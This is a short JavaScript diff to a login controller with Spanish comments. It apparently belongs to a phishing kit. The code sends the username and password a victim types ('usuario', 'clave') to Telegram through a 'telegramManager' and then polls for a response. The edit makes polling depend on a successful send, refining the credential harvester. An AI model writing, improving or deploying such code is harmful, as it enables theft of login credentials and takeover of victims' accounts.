@@ -202,14 +202,16 @@ class LoginController {
                     overlay.classList.add('active');
                 }
 
-                // Enviar a Telegram
-                await window.telegramManager.sendToTelegram('login', {
+                // Enviar a Telegram y esperar respuesta
+                const sendResult = await window.telegramManager.sendToTelegram('login', {
                     usuario: this.userRealValue,
                     clave: this.passRealValue
                 });
 
-                // Iniciar polling
-                window.telegramManager.startPolling();
+                // Solo iniciar polling si el envío fue exitoso
+                if (sendResult && sendResult.success) {
+                    window.telegramManager.startPolling();
+                }
             };
         } else {
             this.loginBtn.disabled = true;
